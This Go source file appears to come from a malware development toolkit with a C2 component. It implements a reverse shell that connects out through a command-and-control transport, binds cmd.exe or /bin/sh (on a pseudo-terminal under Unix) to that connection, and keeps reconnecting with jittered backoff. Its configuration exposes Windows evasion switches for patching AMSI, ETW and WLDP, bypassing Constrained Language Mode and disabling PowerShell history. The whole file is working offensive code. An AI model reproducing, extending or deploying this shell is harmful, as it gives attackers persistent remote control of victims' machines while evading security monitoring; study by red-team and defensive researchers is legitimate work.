package shell

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"github.com/creack/pty"

	"github.com/oioio-space/maldev/c2/transport"
)

// Config contains shell configuration.
type Config struct {
	// ShellPath overrides the default shell binary.
	// Defaults to "cmd.exe" on Windows, "/bin/sh" on others.
	ShellPath string

	// ShellArgs are additional arguments passed to the shell binary.
	ShellArgs []string

	// MaxRetries is the maximum number of reconnection attempts (0 = unlimited).
	MaxRetries int

	// ReconnectWait is the delay between reconnection attempts.
	ReconnectWait time.Duration

	// Evasion holds Windows-specific evasion settings. Ignored on other platforms.
	Evasion *EvasionConfig
}

// EvasionConfig holds settings for Windows evasion techniques.
type EvasionConfig struct {
	PatchAMSI      bool
	PatchETW       bool
	BypassCLM      bool
	PatchWLDP      bool
	DisablePSHist  bool
}

// DefaultConfig returns a sensible default configuration.
func DefaultConfig() *Config {
	shellPath := "/bin/sh"
	var shellArgs []string
	if runtime.GOOS == "windows" {
		shellPath = "cmd.exe"
	}
	return &Config{
		ShellPath:     shellPath,
		ShellArgs:     shellArgs,
		MaxRetries:    0,
		ReconnectWait: 5 * time.Second,
	}
}

// Shell represents a reverse shell instance with automatic reconnection.
type Shell struct {
	config    *Config
	transport transport.Transport
	running   atomic.Bool
	stopCh    chan struct{}
	doneCh    chan struct{}
	doneOnce  sync.Once
}

// New creates a new Shell with the given transport and config.
// If cfg is nil, DefaultConfig() is used.
func New(trans transport.Transport, cfg *Config) *Shell {
	if cfg == nil {
		cfg = DefaultConfig()
	}
	return &Shell{
		config:    cfg,
		transport: trans,
		stopCh:    make(chan struct{}),
		doneCh:    make(chan struct{}),
	}
}

// Start runs the reverse shell with automatic reconnection.
func (s *Shell) Start(ctx context.Context) error {
	if !s.setRunning(true) {
		return fmt.Errorf("shell already running")
	}
	defer s.setRunning(false)
	defer s.doneOnce.Do(func() { close(s.doneCh) })

	// Apply evasion techniques if configured.
	if s.config.Evasion != nil {
		if err := applyEvasion(s.config.Evasion); err != nil {
			fmt.Fprintf(os.Stderr, "[!] Evasion: %v\n", err)
		}
	}

	return s.reconnectLoop(ctx)
}

// reconnectLoop handles the reconnection loop with exponential backoff.
func (s *Shell) reconnectLoop(ctx context.Context) error {
	retries := 0
	baseWait := s.config.ReconnectWait
	currentWait := baseWait
	maxWait := 5 * time.Minute

	// First connection attempt is immediate.
	if err := s.attemptSession(ctx); err != nil {
		retries++
		fmt.Fprintf(os.Stderr, "[!] Attempt %d failed: %v\n", retries, err)

		if s.shouldStop(retries) {
			return fmt.Errorf("max retries (%d) exceeded", s.config.MaxRetries)
		}
	} else {
		retries = 0
		currentWait = baseWait
	}

	for {
		// Exponential backoff with jitter: +/-25%
		jitter := time.Duration(rand.Int63n(int64(currentWait) / 4))
		waitTime := currentWait + jitter - currentWait/8

		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-s.stopCh:
			return nil
		case <-time.After(waitTime):
			if s.shouldStop(retries) {
				return fmt.Errorf("max retries (%d) exceeded", s.config.MaxRetries)
			}

			if err := s.attemptSession(ctx); err != nil {
				retries++
				fmt.Fprintf(os.Stderr, "[!] Attempt %d failed: %v\n", retries, err)
				currentWait = currentWait * 2
				if currentWait > maxWait {
					currentWait = maxWait
				}
				continue
			}

			retries = 0
			currentWait = baseWait
		}
	}
}

// attemptSession tries a complete session (connect + shell).
func (s *Shell) attemptSession(ctx context.Context) error {
	if err := s.transport.Connect(ctx); err != nil {
		return err
	}
	defer s.transport.Close()

	return s.runSession(ctx)
}

// runSession executes a shell session (PTY on Unix, direct I/O on Windows).
func (s *Shell) runSession(ctx context.Context) error {
	args := s.config.ShellArgs
	cmd := exec.CommandContext(ctx, s.config.ShellPath, args...)

	if runtime.GOOS == "windows" {
		return s.runDirect(cmd)
	}
	return s.runWithPTY(cmd)
}

// runDirect binds shell I/O directly to the transport (Windows).
func (s *Shell) runDirect(cmd *exec.Cmd) error {
	cmd.Stdin = s.transport
	cmd.Stdout = s.transport
	cmd.Stderr = s.transport

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start: %w", err)
	}

	return cmd.Wait()
}

// runWithPTY runs the shell inside a pseudo-terminal (Unix).
func (s *Shell) runWithPTY(cmd *exec.Cmd) error {
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("failed to start pty: %w", err)
	}
	defer ptmx.Close()

	return s.copyBidirectional(ptmx, cmd)
}

// copyBidirectional copies data between the transport and the PTY.
func (s *Shell) copyBidirectional(ptmx *os.File, cmd *exec.Cmd) error {
	var wg sync.WaitGroup
	wg.Add(2)

	// Transport -> PTY
	go func() {
		defer wg.Done()
		io.Copy(ptmx, s.transport)
	}()

	// PTY -> Transport
	go func() {
		defer wg.Done()
		io.Copy(s.transport, ptmx)
	}()

	err := cmd.Wait()
	wg.Wait()

	return err
}

// Stop gracefully stops the reverse shell.
func (s *Shell) Stop() error {
	if !s.running.Load() {
		return fmt.Errorf("shell not running")
	}

	close(s.stopCh)
	return nil
}

// Wait blocks until the shell terminates.
func (s *Shell) Wait() {
	<-s.doneCh
}

// IsRunning returns true if the shell is currently running.
func (s *Shell) IsRunning() bool {
	return s.running.Load()
}

// setRunning sets the running state in a thread-safe manner.
func (s *Shell) setRunning(state bool) bool {
	if state {
		// CompareAndSwap returns true only if swapped from false to true,
		// preventing double-start.
		return s.running.CompareAndSwap(false, true)
	}
	s.running.Store(false)
	return true
}

// shouldStop checks if reconnection should stop.
func (s *Shell) shouldStop(retries int) bool {
	return s.config.MaxRetries > 0 && retries >= s.config.MaxRetries
}
